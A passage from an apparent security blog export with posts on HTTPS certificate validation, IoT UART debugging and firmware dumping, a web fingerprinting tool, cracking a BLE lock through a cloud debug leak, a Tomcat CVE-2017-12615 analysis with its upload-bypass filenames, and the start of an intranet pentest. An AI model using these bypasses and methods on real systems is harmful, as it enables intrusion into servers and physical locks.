客户端向服务端发送SSL协议版本号、加密算法种类、随机数等信息。(2) 服务端给客户端返回SSL协议版本号、加密算法种类、随机数等信息，同时也返回服务器端的证书，即公钥证书(3) 客户端使用服务端返回的信息验证服务器的合法性，包括： 1.证书是否过期 2.发型服务器证书的CA是否可靠 3.返回的公钥是否能正确解开返回证书中的数字签名 4.服务器证书上的域名是否和服务器的实际域名相匹配 5.验证通过后，将继续进行通信，否则，终止通信(4) 客户端向服务端发送自己所能支持的对称加密方案，供服务器端进行选择(5) 服务器端在客户端提供的加密方案中选择加密程度最高的加密方式。(6) 服务器将选择好的加密方案通过明文方式返回给客户端(7) 客户端接收到服务端返回的加密方式后，使用该加密方式生成产生随机码，用作通信过程中对称加密的密钥，使用服务端返回的公钥进行加密，将加密后的随机码发送至服务器(8) 服务器收到客户端返回的加密信息后，使用自己的私钥进行解密，获取对称加密密钥。在接下来的会话中，服务器和客户端将会使用该密码进行对称加密，保证通信过程中信息的安全。 Https双向认证机制首先对于双向证书验证，也就是说，客户端有自己的密钥，并持有服务端的证书，服务端给客户端发送数据时，需要将服务端的证书发给客户端验证，验证通过才运行发送数据，同样，客户端请求服务器数据时，也需要将自己的证书发给服务端验证，通过才允许执行请求。客户端双向认证代码实现部分123456789101112131415161718192021222324252627282930313233343536373839public class MySSLSocketFactory &#123;? private static final String KEY_STORE_TYPE_BKS = \"bks\";//证书类型 private static final String KEY_STORE_TYPE_P12 = \"PKCS12\";//证书类型?? private static final String KEY_STORE_PASSWORD = \"****\";//证书密码（应该是客户端证书密码） private static final String KEY_STORE_TRUST_PASSWORD = \"***\";//授信证书密码（应该是服务端证书密码）? public static SSLSocketFactory getSocketFactory(Context context) &#123;?? InputStream trust_input = context.getResources().openRawResource(R.raw.trust);//服务器授信证书 InputStream client_input = context.getResources().openRawResource(R.raw.client);//客户端证书 try &#123; SSLContext sslContext = SSLContext.getInstance(\"TLS\"); KeyStore trustStore = KeyStore.getInstance(KeyStore.getDefaultType()); trustStore.load(trust_input, KEY_STORE_TRUST_PASSWORD.toCharArray()); KeyStore keyStore = KeyStore.getInstance(KEY_STORE_TYPE_P12); keyStore.load(client_input, KEY_STORE_PASSWORD.toCharArray()); TrustManagerFactory trustManagerFactory = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm()); trustManagerFactory.init(trustStore); KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm()); keyManagerFactory.init(keyStore, KEY_STORE_PASSWORD.toCharArray()); sslContext.init(keyManagerFactory.getKeyManagers(), trustManagerFactory.getTrustManagers(), new SecureRandom()); SSLSocketFactory factory = sslContext.getSocketFactory(); return factory; &#125; catch (Exception e) &#123; e.printStackTrace(); return null; &#125; finally &#123; try &#123; trust_input.close(); client_input.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 双向认证过程：(1) 客户端向服务端发送SSL协议版本号、加密算法种类、随机数等信息。(2) 服务端给客户端返回SSL协议版本号、加密算法种类、随机数等信息，同时也返回服务器端的证书，即公钥证书 客户端使用服务端返回的信息验证服务器的合法性，包括： 1.证书是否过期 2.发型服务器证书的CA是否可靠 3.返回的公钥是否能正确解开返回证书中的数字签名 4.服务器证书上的域名是否和服务器的实际域名相匹配(3) 验证通过后，将继续进行通信，否则，终止通信(4) 服务端要求客户端发送客户端的证书，客户端会将自己的证书发送至服务端(5) 验证客户端的证书，通过验证后，会获得客户端的公钥(6) 客户端向服务端发送自己所能支持的对称加密方案，供服务器端进行选择(7) 服务器端在客户端提供的加密方案中选择加密程度最高的加密方式(8) 将加密方案通过使用之前获取到的公钥进行加密，返回给客户端(9) 客户端收到服务端返回的加密方案密文后，使用自己的私钥进行解密，获取具体加密方式，而后，产生该加密方式的随机码，用作加密过程中的密钥，使用之前从服务端证书中获取到的公钥进行加密后，发送给服务端(10) 服务端收到客户端发送的消息后，使用自己的私钥进行解密，获取对称加密的密钥，在接下来的会话中，服务器和客户端将会使用该密码进行对称加密，保证通信过程中信息的安全。 我们身边的app中所使用的加密传输是怎样的呢？某宝（金融类app）的数据加密分析（https单向认证） 为了更加清晰的了解https在实际项目中的应用，特意花了点时间分析了一个app的加密认证过程。app虽然加了部分混淆，但并没有加固，所以也不难分析。（1）整个发送https post请求过程.ip以及域名都是固定的，证书也写死在app里。（2）https认证过程判断代理服务器以及证书校验证书校验过程在获取证书的过程中，仅仅读取了证书的信息，并没有实现校验证书是否安全可靠的代码。这里就留下了安全隐患。使用第三方证书一样可以截获数据。数据解密过程在数据解密过程也不够严谨，密钥和向量通过简单逆向分析就能获得。解密key的获取方式：数据包名的md5解密向量通过这个简单分析，你还敢说你的数据是安全传输的吗？ 安全隐患因为开发方便而信任所有证书重写了校验机制，但并没有做任何检验SSL证书有效性。 扩展 Java Security安全体系知识延伸Java Security 背景知识Java Security其实是Java平台中一个比较独立的模块。除了软件实现上内容外，它实际上对应了一系列的规范。从Java2开始，Java Security包含主要三个重要的规范： JavaCryptography Extension（简写为JCE），JCE所包含的内容有加解密，密钥交换，消息摘要（Message Digest，比如MD5等），密钥管理等。本文所涉及的大部分内容都属于JCE的范畴。JavaSecure Socket Extension（简写为JSSE），JSSE所包含的内容就是Java层的SSL/TLS。简单点说，使用JSSE就可以创建SSL/TLS socket了。JavaAuthentication and Authorization Service（简写为JAAS），JSSA和认证/授权有关。这部分内容在客户端接触得会比较少一点，所以本文不拟讨论它。在上述三个子模块或规范中，JCE是JavaSecurity的大头，其他两个子模块JSSE和JAAS都依赖于它，比如SSL/TLS在工作过程中需要使用密钥对数据进行加解密，那么密钥的创建和使用就依靠JCE子模块了。 另外，既然和安全相关，那么对安全敏感的相关部门或政府肯定会有所干涉。Java是在美国被发明的，所以美国政府对于Java Security方面的出口（比如哪些模块，哪些功能能给其他国家使用）有相关的限制。例如，不允许出口的JCE（从软件实现上看，可能就是从Java官网上下载到的几个Jar包文件）支持一些高级的加解密功能（比如在密钥长度等方面有所限制）。 JCE的介绍JCE最初是作为JCA的扩展包开发的，旨在提供受美国出口控制条例管制的加密服务API和实现。JCE提供一个提供者实现和一组相关的API和包，以支持加密和解密，密钥的生成和协商以及消息验证算法，其中对加密和解密的支持包括对称加密、非对称加密、块加密和流加密。JCE还支持安全流和封装流对象。JCE的架构模型如下图所示： issue1.不要忽略证书校验 2.保护好自己的密钥 3.尽量使用规范的https协议 参考1.http://blog.csdn.net/xdd19910505/article/details/51926540 2.https://www.cnblogs.com/xiekeli/p/5607107.html 3.http://www.jcodecraeer.com/a/anzhuokaifa/androidkaifa/2014/0607/1621.html 4.https://www.waitalone.cn/bank-ssl-cap.html","tags":[{"name":"ssl","slug":"ssl","permalink":"http://www.future-sec.com/tags/ssl/"},{"name":"https","slug":"https","permalink":"http://www.future-sec.com/tags/https/"}],"categories":[{"name":"移动安全","slug":"移动安全","permalink":"http://www.future-sec.com/categories/移动安全/"}]},{"title":"物联网硬件安全分析基础-串口调试","date":"2017-12-04T16:00:00.000Z","path":"iot-security-hardware-debuging.html","text":"前言上节介绍了关于通过编程器直接读取芯片获取固件用来静态分析的一点思路，本篇将介绍通过UART串口来直接与机器交互，通过串口输出输入信息，做动态调试。通用异步收发传输器（Universal Asynchronous Receiver/Transmitter)，通常称作UART，是一种异步收发传输器，是电脑硬件的一部分。它将要传输的资料在串行通信与并行通信之间加以转换。作为把并行输入信号转成串行输出信号的芯片，UART通常被集成于其他通讯接口的连结上。对于物联网硬件的串口调试，多数情况下指的就是通过UART串口进行数据通讯， 但是我们经常搞不清楚它和COM口的区别, 以及RS232, TTL等关系, 实际上UART、COM指的物理接口形式(硬件), 而TTL、RS-232是指的电平标准(电信号).UART有4个pin（VCC, GND, RX, TX）, 用的TTL电平， 低电平为0(0V)、高电平为1（3.3V或以上），Uart串口的RXD、TXD等一般直接与处理器芯片的引脚相连，而RS232串口的RXD、TXD等一般需要经过电平转换(通常由Max232等芯片进行电平转换)才能接到处理器芯片的引脚上，否则这么高的电压很可能会把芯片烧坏。 在调试的时候, 多数情况下我们只引出rx、tx、gnd即可，但是UART的数据要传到电脑上分析就要匹配电脑的接口，通常我们电脑使用接口有COM口和USB口（最终在电脑上是一个虚拟的COM口），但是要想连上这两种接口都要需要进行硬件接口转换和电平转换。 UART串口调试UART调试第一步需要先找到对应的四个PIN，在通电情况下，VCC口可以不要接，判断 GND, RX, TX三个引脚是调试的关键，找四个引脚可以先看PCB上的印字。 但多数厂商在量产前会去掉用于调试的串口印字，如果找不到对应引脚的印字，就需要先分析PCB的结构，一般PCB上有3、4 、5个并排或相距不远的焊点或通孔，就有可能是UART调试串口。 但PCB上可能存在多个这样的焊点或通孔，从多个口中找出真正的调试串口，就需要借助到万用表。 万用表找串口首先需要找到GND口，就是接地口，在疑似串口的焊点处，通过测量电势差，可以判断出GND口，通过连接焊点和输入负极，如果电势为0，就可能是GND口，如果电势为最大值，例如3.6V、5V等，就可能是VCC口。然后通过UART转换器对应的4个口，引出导线，并设置好串口输出环境后，就可以依次尝试。也可以通过短接其中的两口，如果机器重启，就可以判断这两口为VCC和GND。需要注意的是，在TTL电平模式下，UATR转换接口上的RX、TX口与上位设备，也就是PCB上的UART口的RX和TX是需要反接的。 案例一：调试某智能摄像头通过万用表测量电势差之后，在靠近CPU的地方有三个通孔，有可能是UART串口，用导线连接之后，设置波特率为115200。 用SecureCRT连接串口，给机器通上电之后，串口立马输出了启动信息，并可以执行命令，说明串口正确，如果遇到无法输入的情况，首先检查接线是否松动，然后在SecureCRT中的， Session Options -&gt; Connection -&gt; Serial -&gt; Flow Control，将原先选中的 RTS/CTS取消掉，这是因为如果选中了RTS/CTS ，则硬件上要有对应接口，软件上实现对应协议，才能实现此流控制。如果串口输出为乱码，则需要切换波特率，直至输出正常。 案例二：调试某路由器在靠近cpu的地方有四个通孔，测量电势差后，利用导线探针，确定了三个PIN，连接转换器。 串口中输出调试信息，因波特率设置问题，初始输出为乱码，改为38400即可正常输出。 案例三：调试某路由器在PCB上有四个焊点，先测量电势差，分出GND和VCC，在利用焊枪分别焊上导线，连接转换接口，测试出TX和RX口。 设置波特率为57600，串口输出正确，并可执行命令。 案例四：调试某路由器在PCB一侧有5个通孔，并标注有UART-0字样，通电后，测试各口电势差，确实GND和VCC后，连接转换接口，并测试出RX和TX口。 设置波特率为57600，串口输出正确，并可执行命令。 通过本地架设的tftp服务器，并在串口输入命令，开启相关服务，就可以通过tftp与机器传输文件。 案例五：调试某无线数据终端拆开正面压板，发现PCB上标注有印字，利用PCB夹具和探针，引出RX和TX口，连接转换器，因该无线终端串口电压不超过1.7V，焊接容易造成信号衰减，因此采用夹具。 因串口输出信息过多，影响输入和输出结果，因此采用串口调试助手，设置波特率为115200，输入命令并发送，可以成功执行。 案例六：调试某无线数据终端拆解机器，该型机器采用多块电路板层级设计，其主要处理芯片位于顶部，拆解时注意走线位置，防止拉坏接线口，在PCB上有UART的PIN口印字，给每一个PIN口焊上导线，连接转换器。 设置波特率为921600，连接串口，用root账号登陆，密码为空，成功进入系统，执行命令。","tags":[{"name":"硬件安全","slug":"硬件安全","permalink":"http://www.future-sec.com/tags/硬件安全/"},{"name":"UART串口调试","slug":"UART串口调试","permalink":"http://www.future-sec.com/tags/UART串口调试/"}],"categories":[{"name":"硬件安全","slug":"硬件安全","permalink":"http://www.future-sec.com/categories/硬件安全/"}]},{"title":"浅谈现代化指纹识别及工具编写","date":"2017-11-26T16:00:00.000Z","path":"yet-another-web-fingerprinter.html","text":"前言对于庞大的网络空间来说，存在着各式各样的应用、设备等等资产，而对这些资产进行识别，无论拿来做扫描器还是批量分析，都是非常有价值的，高效的应用指纹识别是一个长久可研究的课题，本文主要探讨如何建立高效可靠的指纹识别方法。 传统的指纹识别一些扫描器里面使用的比较多的都是通过特殊路径 静态文件的md5 值或者大小 关键词等，例如使用比较广泛的一个指纹数据库 。 存在几个问题 效率太低，每一个路径都需要访问一次。容易被waf拦截 目前很多网站的静态资源 cdn于gzip 压缩，md5 其实是不一样的 ，识别率很低 现代化指纹识别怎么来快速的精确的指纹识别，观察了大部分的web系统发现，访问首页并且获取response header 能识别出80% 的app例如WordPress，discuz 会把独特的cookie放到header 里面。discuz 的关键词 _saltkey= 默认首页也会有很多固定的关键词， WordPress wp-conetnt 剩下的指纹再去特殊url提取，这样效率和准确率会提高很多很多。 现代化指纹识别方案指纹库设计数据库结构指纹库类型目前有3种 ，当然后续还需要加上正则。finger 规则是一个 string 之后的python 字典,里面有例如状态吗,规则等字段,例如 weblogic 的指纹规则 1&#123;'port':7001,'url': '/console/login/LoginForm.jsp', 'code': 200, 'grep': 'WebLogic Server'&#125; 下面介绍每一种指纹库实例 指纹规则web_header_contain首页 response 里面的 header 查找特征符速度最快,优先极最高。很多web cms 都会写特殊的cookie 键值。例如 discuz,jboss,wordpress 等。规则编写,以discuz 为例 12345678910111213➜ tools curl -I www.cctry.comHTTP/1.1 200 OKServer: Microsoft-IIS/6.0Connection: keep-aliveDate: Thu, 07 Jan 2016 18:22:34 GMTContent-Type: text/html; charset=gbkContent-Length: 0X-Powered-By: PHP/5.2.17Set-Cookie: Vguy_2132_saltkey=O6srsEYk; expires=Sat, 06-Feb-2016 18:22:22 GMT; path=/; httponlySet-Cookie: Vguy_2132_lastvisit=1452187342; expires=Sat, 06-Feb-2016 18:22:22 GMT; path=/Set-Cookie: Vguy_2132_sid=MwE6e0; expires=Fri, 08-Jan-2016 18:22:22 GMT; path=/Set-Cookie: Vguy_2132_lastact=1452190942%09index.php%09; expires=Fri, 08-Jan-2016 18:22:22 GMT; path=/X-Daa-Tunnel: hop_count=1 经过分析,字符串 _saltkey= 为discuz header 中的规则具体规则如下 web_index_contain在缓存的首页里面查找关键词或者正则匹配优先级次之,只需要 get请求一次即可。例如Office Anywhere 指纹 编写流程数据包分析 12345➜ tools curl http://125.91.218.186:8000/ | grep '/images/tongda.ico' % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 2001 100 2001 0 0 11795 0 --:--:-- --:--:-- --:--:-- 11840&lt;link rel=\"shortcut icon\" href=\"/images/tongda.ico\"&gt; 规则编写 web_url_contain特殊url 查找指定的关键词(返回状态码也指定)。优先级最低。例如 weblogic 的指纹 finger 过程数据包分析 12345678910➜ tools curl -I http://202.97.194.9:7001/console/login/LoginForm.jspHTTP/1.1 200 OKCache-Control: no-cacheDate: Thu, 07 Jan 2016 18:53:28 GMTPragma: no-cacheContent-Type: text/html; charset=UTF-8Expires: Thu, 01 Jan 1970 00:00:00 GMTSet-Cookie: ADMINCONSOLESESSION=XQXrWT0LQTvpf8Jv75nMnQB9vN0cGppy7bTfJxfH9S673VTGP1Wl!1715621632; path=/Content-Language: zh-CNX-Powered-By: Servlet/2.5 JSP/2.1 规则 1&#123;'url': '/console/login/LoginForm.jsp', 'code': 200, 'grep': 'WebLogic Server'&#125; 表 程序编写指纹识别模块代码 12345678910111213141516171819202122232425262728293031323334353637383940414243# coding:utf-8\"\"\" *@Projet Yafinger *@Author yaseng@uauc.net *@Desc playweb finger modules\"\"\"import ast,timeimport configfrom lib import utildef get_web_app(url): rsp_index = util.http_get(url) str_index = \"\" if rsp_index == None : return None list_app=[] fingers=config.get('fingers'); for finger in fingers : rule = ast.literal_eval(finger['finger']) if finger['type'] == 'web_index_contain': # limit header and body and code exp : &#123;'header':'jsessionid=','code': 200, 'grep': '.action'&#125; if rule.has_key('header') and rule['header'] not in str(rsp_index['headers']).lower() : continue if rsp_index['code'] == rule['code'] and rule['grep'] in rsp_index['data'] : list_app.append(&#123;'app_id':finger['id'], 'url':url&#125;) util.log(\"url:%s app:%s\" % (url, finger['app_name'])) elif finger['type'] == 'web_url_contain' : rsp_tmp = util.http_get(url + rule['url']) if rsp_tmp == None : continue if rsp_tmp['code'] == rule['code'] and rule['grep'] in rsp_tmp['data'] : list_app.append(&#123;'app_id':finger['id'], 'url':url&#125;) util.log(\"url:%s app:%s\" % (url + rule['url'], finger['app_name'])) elif finger['type'] == 'web_header_contain' : if rule['grep'] in str(rsp_index['headers']).lower() : list_app.append(&#123;'app_id':finger['id'], 'url':url&#125;) util.log(\"url:%s app:%s\" % (url , finger['app_name'])) time.sleep(0.01) return list_app 单独识别简单调用指纹识别模块代码 12345678910111213141516171819202122232425262728293031323334353637383940# coding:utf-8\"\"\" *@Projet Yafinger *@Author yaseng@uauc.net *@Desc yafinger test __ __ ___ /\\ \\ /\\ \\ /'___\\ __ \\ `\\`\\\\/'/ __ /\\ \\__/ /\\_\\ ___ __ __ _ __ `\\ `\\ /' /'__`\\ \\ \\ ,__\\\\/\\ \\ /' _ `\\ /'_ `\\ /'__`\\/\\`'__\\ `\\ \\ \\ /\\ \\L\\.\\_\\ \\ \\_/ \\ \\ \\ /\\ \\/\\ \\ /\\ \\L\\ \\ /\\ __/\\ \\ \\/ \\ \\_\\\\ \\__/.\\_\\\\ \\_\\ \\ \\_\\\\ \\_\\ \\_\\\\ \\____ \\\\ \\____\\\\ \\_\\ \\/_/ \\/__/\\/_/ \\/_/ \\/_/ \\/_/\\/_/ \\/___L\\ \\\\/____/ \\/_/ /\\____/ \\_/__/ \"\"\"import os, time, sys, Queue, threading, astimport configfrom lib import utilfrom lib.db import *from optparse import OptionParserfrom modules import fingerif __name__ == \"__main__\": usage= '''%prog --host host --port port --finger &lt;all|app_name&gt; \\r\\nExample:%prog --url http://127.0.0.1 --finger phpmyadmin ''' parser = OptionParser(usage=usage) parser.add_option(\"-u\", \"--url\", dest=\"url\", help=\"target url\") parser.add_option(\"-f\", \"--finger\", dest=\"finger\", help=\"finger_db app_name,default all \", default=\"all\") options, arguments = parser.parse_args() if options.url == None : parser.print_help() exit(0) db = MySQL(config.db_config) sql_finger_where=' ' if options.finger == 'all' else \" and app_name='%s' \" % options.finger db.query(\"SELECT * from pw_finger_db where `enable`=1 %s \" % sql_finger_where) fingers = db.fetch_all() if len(fingers) == 0 : util.log('finger app_name %s not found' % options.finger ,3,'finger') config.set(\"fingers\",fingers) util.log(\"load fingers count %d\" % len(fingers),1,'finger') finger.get_web_app(options.url) 批量识别 可以使用线程池来实现批量指纹识别。 指纹结果融合到系统中指纹保存在数据库中，本模块可以快速整合到扫描器或者其他项目中。 yafingeryet another web fingerprinterhttps://github.com/yaseng/yafinger issue 指纹库需要补充 可以不局限于web指纹 某些情况可能目前的指纹规则不符合，还需要添加新的指纹规则，例如正则","tags":[{"name":"指纹识别","slug":"指纹识别","permalink":"http://www.future-sec.com/tags/指纹识别/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://www.future-sec.com/categories/web安全/"}]},{"title":"物联网硬件安全分析基础-固件提取","date":"2017-11-26T16:00:00.000Z","path":"iot-security-hardware-obtain.html","text":"前言上节初步介绍一些硬件基础知识和分析硬件所需要的基本工具，本篇将讲述利用编程器直接读取芯片固件的方法。为了读取Flash芯片的内容，有以下两种常用方式： 1、直接将导线连接到芯片的引脚，在通过飞线连接编程器，进行在线读取固件； 2、把芯片拆焊下来，通过烧录座编程器，离线读取固件。 飞线法读取通过夹具夹住芯片引脚，然后连接编程器读取芯片内容，通过编程器连接芯片需要注意引脚的顺序，在IC芯片上都会有一个小点，大多数情况下，小点对应的引脚即为芯片的第一脚，而连接编程器的导线也需要插入编程器上相应的引脚。 案例一：读取中控F7门禁固件拆掉门禁外壳，通过电路图和芯片印字分析，在主板上有一颗FM25F04A存储芯片，通过夹具连接芯片到编程器，在通过专用编程器软件，对该芯片进行读取。 连接完成，确定引脚接线正确后，打开编程器对应软件，通过智能识别芯片ID，即可开始读取固件工作。如无法识别，可根据印字说明，尝试类似的型号，一般情况下兼容。 点击读取，即可开始固件提取，成功之后会保存为BIN格式文件，打开即可看到16进制的内容，为下一步分析提供基础。 案例二：读取某智能摄像头固件拆掉摄像头外壳，通过分析PCB上的各个IC，找到Flash存储芯片。 在显微镜下，可以看到是一颗25L64型号的Flash芯片。 用夹具连接各引脚，并和编程器连接，进行固件读取。 识别到芯片型号为GD25Q64，点击读取，读取完毕后按照提示保存到文件。 打开保存的BIN文件或者查看缓冲区，即可看到固件内容。 在Ubuntu中，用binwalk解包固件，做进一步分析。 案例三：读取某智能摄像头固件打开外壳，在PCB背面发现一颗FLASH存储芯片 通过显微镜发现芯片型号为25L128。 连接编程器读取固件并保存。 案例四：读取某路由器固件打开外壳，发现PCB上有一颗Flash存储器，但厂商出于安全考虑，把芯片印字涂抹掉了。 在不知道芯片型号的情况下，我们连接该芯片，让编程器去尝试读取。 通过智能识别，发现编程器无法识别出具体型号，而因为Flash存储芯片的种类多样，通过查找又无法获得该路由器的具体参数，这时我们通过UART串口，读取出UBOOT启动信息，串口输出里面发现了该芯片型号为W25Q128BV。（下一篇将会重点介绍关于串口调试的方法） 在编程器中选择该型号，成功提取出固件。 用binwalk解包固件。 案例五：读取某智能电饭锅固件拆掉外壳，背面嵌有一块PCB，反面是WIFI处理芯片，正面为存储器，连接编程器。 通过印字分析为25芯片，存储大小为2M字节，尝试该型号芯片，成功读取固件。 案例六：读取某网络监控摄像机固件在PCB上找到一块25L128型号的Flash存储芯片。 通过夹具连接编程器。 识别到芯片为MX25L128，选择其中一种，成功提取固件。 用binwalk解包固件内容。 拆焊芯片读取固件一般情况下，对于TSOP8封装的闪存芯片，可以用上述方法来读取，但可能存在在线读取成功率不高或数据丢失的情况，对于更多引脚和封装格式的芯片，飞线的难度更高，有一定锡焊基础的建议采用拆焊芯片，用烧录座离线读取的方法。 热风枪设置在适合的温度，吹下芯片，周围的元件可以用铝箔或锡箔纸适当保护。 拆下的闪存芯片放在烧录座上，在连接编程器进行读写，芯片放置的引脚方向要注意对齐编程器和烧录座的第一脚。 读取完成，用点焊法把芯片焊上焊盘即可。 更多芯片焊接修改操作请参考2.4.2 硬件修改一节 jtag提取固件拆焊芯片首先用热风枪拆下智能锁主控芯片，该单片机型号为：Stm32F103R6。 烧录座连接Jlink芯片第一脚对齐烧录座第一脚，然后把Jlink插入烧录座引出的JTAG接口。 读取固件电脑上安装好Jlink驱动，打开J-Flash客户端，设置好参数，主要在配置栏选择正确的芯片型号，然后点击连接，在点击Target-&gt;Read Back-&gt;Entire trip即可读写固件。","tags":[{"name":"硬件安全","slug":"硬件安全","permalink":"http://www.future-sec.com/tags/硬件安全/"},{"name":"硬件分析","slug":"硬件分析","permalink":"http://www.future-sec.com/tags/硬件分析/"}],"categories":[{"name":"硬件安全","slug":"硬件安全","permalink":"http://www.future-sec.com/categories/硬件安全/"}]},{"title":"如何破解一个蓝牙锁","date":"2017-11-26T16:00:00.000Z","path":"how-to-crack-a-ble-lock.html","text":"前言随着物联网各类技术的逐步进步，越来越多的智能设备出现在我们生活中，智能锁在锁具市场上所占的份额将会越来越大，甚至超过传统锁，成为主流。而在智能锁中，因为低功耗蓝牙技术的推广，以及受外部环境限制小，通过手机APP交互方便等特点，很多智能锁采用的就是以BLE蓝牙芯片作为控制单元，控制电机或锁簧转动的模式，实现开关锁功能。与其他的安全问题相比，锁具的被破解，可能造成的危害更大，本文通过以破解某型号蓝牙锁，来展示目前蓝牙智能锁可能面临的安全风险。 蓝牙锁介绍 蓝牙锁由于不受外部环境限制，功耗较低，和手机交互方便，目前用的比较多,形状也五花八门，例如目前使用最广泛的一些智能蓝牙锁。 如何去破解一个蓝牙锁 目标介绍这个属于低功耗蓝牙锁，使用app 绑定之后可以开启，还能共享密码，修改密码。 内部构架显微镜查看电路板 拆解 蓝牙锁内部搭载了一块CC2541蓝牙芯片，通过控制电机驱动芯片，带动卡榫运转，从而形成拉锁的开关。CC2541是TI推出的一款专门适用于BLE和专用的2.4GHz应用的SOC芯片解决方案,CC254X在目前物联网蓝牙通信解决方案中，市场占有率很高，应用场景非常广泛。 探测使用app初步连接探测，可以看到 开锁流程Logcat 查看app日志 流程为 攻击方式一般对于蓝牙锁的攻击方式有三种 1、重放攻击2、暴力破解(6位数字)3、云端漏洞 重放攻击 通过蓝牙抓包分析，发现通信过程没有加密，可以重放获取认证密码，但如果要模拟真实的智能锁攻击场景，显然不能通过如此显眼的方式，真实环境中往往很难有一个给我们抓包或劫持的场景，所以最好的方式是远程无接触开锁，需要去找云端的漏洞。 云端漏洞云端是Thinkphp5 写的，稍微看了一下,存在有两个漏洞。无认证可以遍历所有id拿到所有锁的信息 没有关闭调试模式会泄露信息,传入一个空的id会吧所有锁的信息报错显示出来，泄露所有锁的密码以及绑定的电话号码mac地址等信息。 漏洞利用对于真实的破解锁场景，最好用一个手机app来开锁掩人耳目，综合以上分析，编写一个开锁Android app 。工作流程为 利用 com.inuker.bluetooth 库快速开发 APP界面 视频演示 https://v.qq.com/x/page/b051058vicv.html 参考ti官方页面 http://www.ti.com.cn/product/cn/CC2541cc2541蓝牙芯片手册 https://wenku.baidu.com/view/c7f99ac7376baf1ffd4fad31.html","tags":[{"name":"智能锁","slug":"智能锁","permalink":"http://www.future-sec.com/tags/智能锁/"},{"name":"蓝牙攻击","slug":"蓝牙攻击","permalink":"http://www.future-sec.com/tags/蓝牙攻击/"}],"categories":[{"name":"硬件安全","slug":"硬件安全","permalink":"http://www.future-sec.com/categories/硬件安全/"}]},{"title":"Tomcat 远程代码执行漏洞分析（CVE-2017-12615）","date":"2017-11-19T16:00:00.000Z","path":"tomcat-code-execution.html","text":"复现环境环境是Windows 7 64位 Apache Tomcat 7.0.70 复现过程根据描述，在 Windows 服务器下，将 readonly 参数设置为 false 时，即可通过 PUT 方式创建一个 JSP 文件，并可以执行任意代码。通过阅读 conf/web.xml 文件，可以发现：修改 Tomcat 7.0/conf/web.xml 文件。添加 readonly 属性，设置为false。重启tomcat启动 Tomcat，利用 PUT 请求创建文件：提示 404。通过所描述的 Windows 受影响，可以结合 Windows 的特性。一是 NTFS 文件流，二是文件名的相关限制（比如 Windows 中文件名不能以空格结尾）来绕过限制：访问发现可以正常输出： 原理分析本次的tomcat漏洞涉及到DefaultServlet和 JspServlet。Tomcat的Servlet 是在 conf/web.xml 配置的，通过配置文件可知，当后缀名为 .jsp 和 .jspx 的时候，是通过JspServlet处理请求的，下面的默认的配置情况：而其他的静态文件时通过DefaultServlet处理的，同时DefaultServlet 可以处理 PUT 或 DELETE请求：也就是说，除了jsp和jspx默认是由org.apache.jasper.servlet.JspServlet处理，其他默认都是由org.apache.catalina.servlets.DefaultServlet来处理。从而的得知，即是设置readonly为false，tomcat在默认情况下也不允许PUT上传jsp和jspx文件，因为后端都用org.apache.jasper.servlet.JspServlet来处理jsp或是jspx后缀的请求了，而JspServlet中没有PUT上传的相关操作，PUT的代码实现只存在于DefaultServlet中。这个漏洞的根本是通过构造特殊后缀名，绕过了tomcat检测，让它用DefaultServlet的逻辑去处理请求，从而上传jsp文件。目前主要三种方法：123test.jsp%20test.jsp::$DATAtest.jsp/ (bypass) 可以得知，“test.jsp ”（末尾有一个和空格即“test.jsp%20”）和“test.jsp::$DATA”并不能匹配到 JspServlet，而是会交由DefaultServlet去处理。当处理 PUT 请求时：主要是doPut，这里tomcat开始处理PUT请求，可以看到这里如果readonly是true就直接进入error了，所以在前面的步骤中需要设置成false。会调用resources.bind：而继续调用dirContext.bind真正写入文件在FileDirContext.java的rebind函数里又由于 Windows 不允许“ ”（此处为一个空格）作为文件名结尾，所以会创建一个 .jsp 文件，导致代码执行。FileOutputStream特性到这里是否会想，当请求jsp%20或是jsp::$DATA后缀的时候，为什么最终却写入.jsp后缀的文件?这些其实是java.io. FileOutputStream的问题了，需要进一步分析jdk的C代码才能得到解答，如图跟进去FileOutputStream跟进去open跟到open是native的，不是java层面的问题了，这里open实际上是一个jni接口，然后调用windows API CreateFileW创建文件，这里下载openjdk6的jdk代码进行分析，如图:FileOutputStream_md.c这里Java_java_io_FileOutputStream_open便是上面java代码里open函数的C代码实现，其中参数path对应open函数的name变量，继续跟踪，如图:io_util_md.c继续跟进去winFileHandleOpen，这里最终调用windows的CreateFileW实现文件创建，如图：io_util_md.c而在windows下，创建文件是对后缀名称进行处理的，例如：如果后缀末尾是空格，会被去掉，a.txt::$DATA传入CreateFileW也会被处理成a.txt Bypass 分析然而，当 PUT 地址为/test.jsp/时，仍然会创建 JSP，会影响 Linux 和 Windows 服务器，并且 Bypass 了之前的补丁，分析如下。在进入 bind 函数时，会声明一个 File 变量：进入 File 后，会对 name 进行 normalize (在file.class)继续跟入在这里这个normalize(path, n, (prev == slash) ? i - 1 : i)会将文件名末尾的/过滤掉，所以可以导致后面文件写入jsp文件。 影响由于存在去掉最后的 / 的特性，那么这个漏洞自然影响 Linux 以及 Windows 版本。而且经过测试，这个漏洞影响全部的 Tomcat 版本，从 5.x 到 9.x 都会受到影响。目前来说，最好的解决方式是将 conf/web.xml 中对于 DefaultServlet 的 readonly 设置为 true，（默认设置是false）。","tags":[{"name":"Tomcat","slug":"Tomcat","permalink":"http://www.future-sec.com/tags/Tomcat/"},{"name":"远程代码执行","slug":"远程代码执行","permalink":"http://www.future-sec.com/tags/远程代码执行/"}],"categories":[{"name":"系统安全","slug":"系统安全","permalink":"http://www.future-sec.com/categories/系统安全/"}]},{"title":"记一次曲折的内网渗透","date":"2017-11-19T16:00:00.000Z","path":"network-penetration.html","text":"环境 网络：内网C1和C2处于同一网段，可以互通，仅DNS可以访问外网。 安全防护：360全家桶、安全狗、云锁定制版、金山卫士 其他相关信息如下表： 基本情况C1是通weblogic反序列化拿下的，具体怎么获取的webshell就不细说了，根据C1的配置、文件、主机名和数据库等信息可以知道，目标网站之前是存放再C1的，因为上面的源码和数据库基本上和C2的一致。通过weblogic的配置文件可以知道C2的真实IP，主机上面存在各种安全防护软件，各种全家桶，很多命令、脚本和exe都无法运行，比如带有net的命令都无法运行，net、netstat、sc、wscript等 